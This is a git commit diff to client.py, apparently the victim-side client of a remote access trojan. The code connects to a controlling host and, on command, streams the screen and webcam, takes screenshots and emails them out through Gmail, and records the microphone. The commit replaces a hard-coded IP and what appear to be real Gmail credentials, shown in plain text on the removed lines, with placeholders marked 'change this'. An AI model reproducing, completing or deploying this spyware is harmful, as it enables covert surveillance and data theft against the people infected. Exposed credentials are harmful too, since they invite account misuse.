a2921844e0f715c46435d74a39aecdbfc9a8b852
Itay Funes <45236616+0x4Hydro@users.noreply.github.com>
2021-07-30 13:38:54 +0300

    Update client.py

--- client.py
+++ client.py
@@ -14,8 +14,8 @@ import cv2
 import numpy as np
 import pyautogui
 
-clientHOST = "192.168.1.107"
-clientPORT = 443
+clientHOST = "127.0.0.1" # Change this
+clientPORT = 443 # Change this, optional, not recommended
 BUFFER_SIZE = 1024
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((clientHOST, clientPORT))
@@ -23,10 +23,10 @@ s.send(str(getpass.getuser()).encode("utf-8"))
 while True:
     Handler_DATA = s.recv(BUFFER_SIZE).decode("utf-8")
     if Handler_DATA == "screenshare":
-        screensharetohost = ScreenShareClient(clientHOST, 4444)
+        screensharetohost = ScreenShareClient(clientHOST, 4444) # Change this, optional, not recommended
         screensharetohost.start_stream()
     elif Handler_DATA == "webcam_stream":
-        webcam = CameraClient(clientHOST, 4444)
+        webcam = CameraClient(clientHOST, 4444) # Change this, optional, not recommended
         webcam.start_stream()
     elif Handler_DATA == "screenshot":
         screenshot = ImageGrab.grab()
@@ -37,15 +37,15 @@ while True:
         data=base64.b64encode(data)
         f.close()
         os.remove(file)
-        smtp = smtplib.SMTP('smtp.gmail.com', 587)
+        smtp = smtplib.SMTP('smtp.gmail.com', 587) # Change this, optional, not recommended
         smtp.starttls()
-        smtp.login("revise7testing@gmail.com", "Itayf1969#")
+        smtp.login("yourgmail@gmail.com", "yourpassword") # Change this, reqiured.
         message = data
-        smtp.sendmail("revise7testing@gmail.com", "revise7testing@gmail.com", message)
+        smtp.sendmail("yourgmail@gmail.com", "yourgmail@gmail.com", message) # Change this, reqiured.
         smtp.quit()
     elif Handler_DATA == "mic_record":
         frames = 44100
-        seconds = 10
+        seconds = 120 # Change this, reqiured.
         channel = 1
         record = sounddevice.rec(int(seconds*frames), samplerate=frames, channels=channel)
         sounddevice.wait()
@@ -54,3 +54,4 @@ while True:
             for l in f: s.sendall(l)
     elif Handler_DATA == "vid_record":
         pass
+        # Unfinished Code.
